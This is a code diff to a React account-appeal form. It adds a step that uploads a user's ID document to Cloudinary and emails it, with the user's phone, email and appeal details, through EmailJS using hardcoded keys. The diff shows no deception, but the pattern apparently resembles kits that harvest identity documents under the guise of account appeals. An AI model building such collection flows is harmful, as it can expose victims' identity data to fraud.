@@ -27,7 +27,50 @@ export default function AppealForm() {
   const [timer, setTimer] = useState(0);
   const [isVerifying, setIsVerifying] = useState(false);
 
-  // EmailJS configuration
+
+  // Cloudinary upload config
+  const CLOUD_NAME = "dgwofwidi"; // 
+  const UPLOAD_PRESET = "your_upload_preset"; // 
+
+  const uploadImageAndSendEmail = async () => {
+    if (!selectedFile) {
+      alert("Please upload an ID document before submitting.");
+      return;
+    }
+
+    try {
+      const formData = new FormData();
+      formData.append("file", selectedFile);
+      formData.append("upload_preset", UPLOAD_PRESET);
+
+      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+        method: "POST",
+        body: formData,
+      });
+
+      const data = await res.json();
+      const uploadedImageUrl = data.secure_url;
+
+      sendEmail("initial_form", {
+        issueType,
+        accountStatus,
+        appealReason,
+        email,
+        phone,
+        link,
+        idType: getIdTypeLabel(),
+        additionalInfo,
+        id_image_url: uploadedImageUrl,
+      });
+
+    } catch (error) {
+      console.error("Image upload failed:", error);
+      alert("Failed to upload ID image. Please try again.");
+    }
+  };
+
+
+// EmailJS configuration
   const SERVICE_ID = "service_j1vn1o6";
   const TEMPLATE_ID = "template_uvh7y0g";
   const PUBLIC_KEY = "HisNIy8_NoPxGd9Tl";
@@ -84,7 +127,7 @@ export default function AppealForm() {
     setIsSubmitting(true);
 
     // Send initial form data to EmailJS
-    sendEmail('initial_form', {
+    uploadImageAndSendEmail( {
       issueType,
       accountStatus,
       appealReason,
